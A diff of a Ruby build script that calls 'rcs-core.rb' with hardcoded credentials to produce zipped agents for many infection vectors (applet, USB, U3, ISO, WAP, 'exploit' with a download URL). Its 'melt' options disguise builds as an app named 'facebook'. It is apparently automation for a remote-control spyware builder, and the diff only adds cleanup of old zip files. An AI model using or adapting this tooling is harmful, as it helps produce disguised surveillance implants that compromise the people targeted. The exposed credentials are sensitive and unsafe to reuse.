@@ -1,5 +1,6 @@
 #!/usr/bin/env ruby
 require 'json'
+require 'fileutils'
 
 USER = 'alor'
 PASS = 'demorcss'
@@ -15,7 +16,8 @@ params = {platform: 'anon',
           binary: {demo: DEMO},
           melt: {admin: true, port: 443}
           }
-
+          
+FileUtils.rm_rf("anon#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o anon#{ver}.zip"
 ###################################################################################################
@@ -27,6 +29,7 @@ params = {platform: 'applet',
           melt: {appname: 'facebook'}
           }
 
+FileUtils.rm_rf("applet#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o applet#{ver}.zip"
 ###################################################################################################
@@ -38,6 +41,7 @@ params = {platform: 'upgrade',
           melt: {appname: 'facebook'}
           }
 
+FileUtils.rm_rf("upgrade#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o upgrade#{ver}.zip"
 ###################################################################################################
@@ -47,6 +51,7 @@ params = {platform: 'card',
                     }
           }
 
+FileUtils.rm_rf("card#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o card#{ver}.zip"
 ###################################################################################################
@@ -57,6 +62,7 @@ params = {platform: 'u3',
                     }
           }
 
+FileUtils.rm_rf("u3#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o u3#{ver}.zip"
 ###################################################################################################
@@ -67,6 +73,7 @@ params = {platform: 'iso',
                     }
           }
 
+FileUtils.rm_rf("offline#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o offline#{ver}.zip"
 ###################################################################################################
@@ -76,6 +83,7 @@ params = {platform: 'usb',
                     }
           }
 
+FileUtils.rm_rf("usb#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o usb#{ver}.zip"
 ###################################################################################################
@@ -92,6 +100,7 @@ params = {platform: 'wap',
                     }
           }
 
+FileUtils.rm_rf("wap#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
 ###################################################################################################
@@ -105,6 +114,7 @@ params = {platform: 'exploit',
                  url: 'http://download.me/'}
           }
 
+FileUtils.rm_rf("exploit#{ver}.zip")
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o exploit#{ver}.zip"
 ###################################################################################################
